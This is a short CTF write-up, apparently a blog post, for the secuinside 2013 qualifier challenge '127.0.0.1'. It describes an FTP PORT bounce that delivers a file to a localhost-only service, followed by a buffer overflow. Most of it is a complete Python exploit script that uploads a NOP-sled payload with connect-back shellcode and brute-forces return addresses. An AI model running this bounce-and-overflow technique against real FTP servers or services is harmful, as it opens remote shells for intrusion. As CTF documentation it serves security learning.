---
title: secuinside CTF Quals 2013 127.0.0.1 writeup
author: cbmixx
layout: post
permalink: /secuinside-ctf-quals-2013-127-0-0-1-writeup/
categories:
  - Uncategorized
---
We need to connect to a service restricted to be accessed from localhost only. An FTP server is also supplied to public.

Soon we realized that `PORT` command may help us bypass the limitation. For example,

<pre>PORT 127,0,0,1,12,60
RETR /path/to/payload
</pre>

will make FTP server connect to 127.0.0.1:3126, and send content of the file to it.

We just used standard buffer overflow way to run connect back shellcode and get the key.

Note that FTP server sends and then closes socket immediately, which means payload too short will cause `localonly` breaking its own sending procedure in early stage. We need payload large enough to make `send()` blocked until `recv()` called in localonly. 64kB seems to be OK for that.

<pre>#!/usr/bin/env python2
import sys
from ftplib import FTP
from telnetlib import Telnet
import struct

from pwn import * # thanks pwnies
context('i386', 'linux', 'ipv4')

HOST = 
PORT = 
FTP_HOST = '54.214.247.89'

sc = asm(shellcode.connectback(HOST, PORT))

def get_payload(f, addr):
    f.write('\x90' * 88)
    f.write('\x00\xf2\xff\xbf')
    f.write(struct.pack('&lt;I&#039;, addr))

    f.write(&#039;\x90&#039; * (0x200 - len(sc) - 96))
    f.write(sc)
    f.write(&#039;\x90&#039; * (0x10000 - 0x200))

def upload(f, path):
    ftp = FTP(FTP_HOST)
    ftp.login()
    ftp.set_pasv(False)
    print ftp.storbinary(&#039;STOR &#039; + path, f)
    ftp.quit()
    f.close()

def run(path):
    s = Telnet(FTP_HOST, 21, 5)
    print s.read_until(&#039;220&#039;)
    s.write(&#039;USER anonymous\n&#039;)
    print s.read_until(&#039;331&#039;)
    s.write(&#039;PASS a\n&#039;)
    print s.read_until(&#039;230&#039;)
    s.write(&#039;TYPE I\n&#039;)
    print s.read_until(&#039;200&#039;)
    s.write(&#039;PORT 127,0,0,1,12,60\n&#039;)
    print s.read_until(&#039;200&#039;)
    s.write(&#039;RETR %s\n&#039; % path)
    print s.read_until(&#039;150&#039;)
    print s.read_until(&#039;226&#039;)
    s.write(&#039;QUIT\n&#039;)
    print s.read_until(&#039;221&#039;)
    s.close()


p = &#039;/tmp/p&#039;
fn = &#039;p&#039;
for addr in xrange(0xbfffff80, 0xbfff0000, -0x80):
    f = open(fn, &#039;wb&#039;)
    get_payload(f, addr)
    f.close()
    f = open(fn, &#039;rb&#039;)
    upload(f, p)
    run(p)
</pre>